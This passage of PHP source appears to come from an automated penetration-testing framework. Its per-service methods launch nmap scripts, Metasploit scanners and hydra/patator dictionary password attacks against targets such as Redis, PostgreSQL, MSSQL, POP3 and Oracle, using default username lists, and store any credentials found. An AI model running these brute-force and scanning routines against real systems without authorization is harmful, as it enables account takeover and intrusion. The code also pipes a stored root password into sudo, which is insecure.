	public function service2x11(){
	    $this->ssTitre(__FUNCTION__);
	    // xdpyinfo
	    $query = "echo \"db_status\nuse auxiliary/scanner/x11/open_x11\nset RHOSTS $this->ip\nset RPORT $this->port\nrun\nexit\n \" > $this->dir_tmp/".__FUNCTION__.".rc && echo '$this->root_passwd' | sudo -S msfconsole -q -r $this->dir_tmp/".__FUNCTION__.".rc "; // -y /usr/share/metasploit-framework/config/database.yml" ;
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	public function service2vmauth(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"vmauthd-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("vmauthd",$user_test);
	        $query = "patator vmauthd_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
	        //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
	    }
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("vmauthd", $user2name, $user2pass);
	    }
	    
	    
	}
	
	
	
	public function service2tls1(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo \"x\" | openssl s_client -connect $this->ip:$this->port -cipher NULL,LOW -tls1  ";
	    return $this->req_ret_str($query);
	    
	}
	
	public function service2sock5(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"socks-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("socks5",$user_test);
	    }
	    
	    
	    return $result;
	}
	
	
	
	public function service2rpcap(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"rpcap-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("rpcap",$user_test);
	    }
	    return $result;
	}
	
	
	public function service2rsync(){
	    $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"rsync-*\" --script-args 'rsync-brute.module=www' $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    return $this->auth2login4nmap($this->req2BD($this->colonne,$this->table,"$this->port2where AND service2name = '$this->service_name' AND service2version = '$this->service_version' ",$query),__FUNCTION__);
	    
	}
	
	public function service2redis(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"redis-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("redis",$user_test);
	    }
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("redis", $user2name, $user2pass);
	    }
	    
	    return $result;
	}
	
	
	public function service2pop3(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"pop3-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("mail","mail-daemon","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("pop3",$user_test);
	        $query = "patator pop_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
	        //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
	    }
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("pop3", $user2name, $user2pass);
	    }
	    
	    return $result;
	}
	
	public function service2pgsql(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"pgsql-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("pgsql","postgres","mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("postgres",$user_test);
	        $query = "patator pgsql_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='password authentication failed for user'  ";
	        //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
	    }
	    
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("postgres", $user2name, $user2pass);
	    }
	    
	    return $result;
	}
	
	public function service2pcanywhere(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"pcanywhere-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("root","admin","administrator","guest","user","test");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("pcanywhere",$user_test);
	    }
	    
	    $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
	    $conn = $this->mysql_ressource->query($sql_r);
	    while ($row = $conn->fetch_assoc()){
	        $user2name = trim($row['user2name']);
	        $user2pass = trim($row['user2pass']);
	        $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
	        if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("pcanywhere",$user2name,$user2pass);
	    }
	    
	    return $result;
	}
	
	
	public function service2oracle(){
	    $result = "";
	    $this->ssTitre(__FUNCTION__);
	    
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"oracle-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->req_ret_str($query);
	    
	    $query = "OracleScanner -s $this->ip -P $this->port ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->req_ret_str($query);
	    
	    $query = "sidguess -i $this->ip -p $this->port ";
	    //$result .= $this->cmd("localhost",$query);$result .= $this->req_ret_str($query);
	    
	    /*
	     oracle_login host=10.0.0.1 sid=FILE0 0=sids.txt -x ignore:code=ORA-12505
	     oracle_login host=10.0.0.1 user=SYS password=FILE0 0=passwords.txt -x ignore:code=ORA-01017
	     
	     */
	    $users_test = array("SYS","oracle","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $query = "patator oracle_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:code=ORA-01017";
	        //$result .= $this->cmd("localhost",$query);$result .= $this->req_ret_str($query);
	    }
	    
	    
	    return $result;
	}
	
	
	public function service2msrpc(){
	    $result = "";
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap  -Pn -n --script msrpc-enum.nse -s$this->protocol -p $this->port $this->ip -e $this->eth -oX -";

	    return $this->req_ret_str($query);
	}
	
	
	public function service2mssql(){
	    $result = "";
	    
	    $result .= $this->ssTitre(__FUNCTION__);
	    $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"ms-sql-*\" $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
	    $result .= $this->cmd("localhost",$query);
	    $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
	    
	    $users_test = array("mssql","mail","anonymous","ftp","cisco","root","admin","administrator","guest","user","test","voip");
	    foreach ($users_test as $user_test){
	        $result .= $this->port2auth4dico4hydra("mssql",$user_test);
	    }
	    
	    $query = "patator mssql_login host=$this->ip port=$this->port user=$user_test password=FILE1  1=$this->dico_password.1000 -x ignore:fgrep='no such user'   ";
	    //$result .= $this->cmd("localhost",$query); $result .= $this->req_ret_str($query);
	    
	    return $result;
	}
	

	public function service4info(){
	    echo "\n====START SERVICE4INFO:$this->port=======================================================\n";
	    $this->titre(__FUNCTION__);
	    $date_now = date('Y-m-d H:i:s');
	    $this->article("Date Now", $date_now);
	    $this->article("Date Rec", $this->date_rec);

	    $this->article("HOST", $this->tab($this->ip2host()));
	    $this->article("ID PORT", $this->port2id);
	    $this->article("PORT NUMBER", $this->port);
	    $this->article("PROTOCOL", $this->protocol);
	    $this->article("NAME",$this->service_name);
	    $this->article("VERSION",$this->service_version);
	    $this->article("PRODUCT",$this->service_product);
	    $this->article("extrainfo",$this->service_extrainfo);
	    $this->article("hostname",$this->service_hostname);
	    $this->article("Indice confiance",$this->service_conf."/10");
	    $service2banner = trim($this->service2banner());$this->article("Banner",$service2banner);
	    echo "====END SERVICE4INFO:$this->port=======================================================\n\n";	    
	    	} 


	
	public function service4switch(){
	    // https://kalilinuxtutorials.com/metateta-scanning-exploiting-network/
	    
	    $result = "";
	    $this->ssTitre(__FUNCTION__);
		
	    $service = "tftp";
	    if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2tftp();
		$service = "ftp";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ftp();
		$service = "auth";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ident();
		$service = "ssh";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ssh();
		$service = "ajp";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ajp();
		$service = "asterisk";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2asterisk();
		$service = "cisco";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2cisco();
		$service = "couchdb";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2couchdb4nmap();
		$service = "db2";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2db2nmap();
		$service = "dns";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"domain" )) ) return $result .= $this->service2dns();
		$service = "finger";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2finger();
		$service = "http";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2web();
		$service = "ident";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ident();
		$service = "imap";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2imap();
		$service = "jdwp";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2jdwp();
		$service = "ldap";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ldap();
		$service = "mongodb";
		if( (stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"mongod" )) ) return $result .= $this->service2mongodb();
		$service = "ms-sql";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"mssql" )) ) return $result .= $this->service2mssql();
		$service = "mysql";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2mysql();
		$service = "netbios";
		if(((stristr($this->service_name,$service )) || (stristr($this->service_version,$service)))   ) return $result .= $this->service2netbios();
		$service = "nfs";
		if( (stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"mountd" ))  ) return $result .= $this->service2nfs();
		$service = "rdp";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2rdp();
		$service = "msrpc";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2msrpc();
		$service = "rpc";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"status" )) || (stristr($this->service_name,"rpcbind" ))  ) return $result .= $this->service2rpc();
		$service = "shell";
		if( (stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"rshd" ))  ) return $result .= $this->service2shell();
		$service = "sip";if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2sip();
		$service = "smb";
		if( (stristr($this->service_name,$service)) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"samba")) || (stristr($this->service_name,"netbios-ssn")) || (stristr($this->service_name,"microsoft-ds")) ) return $result .= $this->service2smb();
		$service = "smtp";
		if((stristr($this->service_name,$service)) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"submission" )) ) return $result .= $this->service2smtp();
		$service = "snmp";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"smux" )) ) return $result .= $this->service2snmp();
		$service = "telnet";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2telnet();
		$service = "vpn";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service)) || (stristr($this->service_name,"isakmp" )) ) return $result .= $this->service2vpn();
		$service = "x11";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2x11();
		$service = "web";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2web();
		$service = "iis";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2web();
		$service = "login";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2rlogin();
		$service = "winrm";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2winrm();		
		$service = "vmware-auth";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2vmauth();
		$service = "asf-rmcp";
		if((stristr($this->service_name,$service )) || (stristr($this->service_version,$service))) return $result .= $this->service2ipmi();
		
		
		
		
		return $result;
		
	}

	// #################################################################################

	

	public function service2web(){
	    $result = "";
	    $this->ssTitre(__FUNCTION__);
	    
	    $this->ip2vhost();
	    $obj_web = new WEB($this->stream,$this->eth,$this->domain,$this->ip,"http://$this->ip:$this->port/");
		$obj_web->poc($this->flag_poc);		
		//$obj_web->web4info();
		$obj_web->web4info8nmap();$obj_web->web2scan4gui4zap();
		//if($obj_web->web2check_200()) $result .= $obj_web->web4pentest();
		
		$obj_web = new WEB($this->stream,$this->eth,$this->domain,$this->ip,"https://$this->ip:$this->port/");
		$obj_web->poc($this->flag_poc);
		//$obj_web->web4info();
		$obj_web->web4info8nmap();$obj_web->web2scan4gui4zap();
		//if($obj_web->web2check_200()) $result .= $obj_web->web4pentest();

		
		$host = "";
		$hosts = $obj_web->ip2host();
		if (!empty($hosts)){
		    foreach ($hosts as $host){
		        $obj_web = new WEB($this->stream,$this->eth,$this->domain,$this->ip,"http://$host:$this->port/");
		$obj_web->poc($this->flag_poc);
		//$obj_web->web4info();
		$obj_web->web4info8nmap();$obj_web->web2scan4gui4zap();
		//if($obj_web->web2check_200()) $result .= $obj_web->web4pentest();
		
		$obj_web = new WEB($this->stream,$this->eth,$this->domain,$this->ip,"https://$host:$this->port/");
		$obj_web->poc($this->flag_poc);
		//$obj_web->web4info();
		$obj_web->web4info8nmap();$obj_web->web2scan4gui4zap();
		//if($obj_web->web2check_200()) $result .= $obj_web->web4pentest();
		    }
		}
		
		return $result;
	}
	
	


	
    













}
?>
